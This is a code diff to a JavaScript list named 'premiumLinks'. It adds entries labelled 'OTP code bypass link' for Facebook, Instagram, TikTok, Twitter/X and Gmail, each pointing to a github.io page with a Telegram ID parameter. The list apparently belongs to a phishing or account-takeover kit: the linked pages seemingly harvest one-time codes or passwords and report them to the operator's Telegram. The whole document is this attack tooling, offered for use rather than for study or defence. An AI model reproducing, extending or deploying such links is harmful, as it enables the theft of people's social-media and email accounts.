@@ -17,4 +17,13 @@ const premiumLinks = [
       { name: "Twitter(X) Verification code bypass link", image: "https://rrloaty.github.io/intelligent/X.png", urlTemplate: "https://olptyi.github.io/nb/tw?id={telegram-id}" },
       { name: "Gmail Verification code bypass link", image: "https://rrloaty.github.io/intelligent/gmai.png", urlTemplate: "https://olptyi.github.io/nb/gma?id={telegram-id}" },
       { name: "Tiktok Verification code bypass link", image: "https://rrloaty.github.io/intelligent/tiktok.png", urlTemplate: "https://olptyi.github.io/nb/ti?id={telegram-id}" },
+      
+      //new codes here
+      
+        { name: "Facebook OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://olptyi.github.io/nb/face/Fpass.html?id={telegram-id}" },
+        //not Facebook
+                { name: "Instagram OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://olptyi.github.io/nb/ins/igpass.html?id={telegram-id}" },
+                        { name: "Tiktok OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://olptyi.github.io/nb/ti/tik.html?id={telegram-id}" },
+     { name: "Twiter (X) OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://olptyi.github.io/nb/tw/tx.html?id={telegram-id}" },
+      { name: "Gmail OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://olptyi.github.io/nb/gma/gpass.html?id={telegram-id}" },
     ];
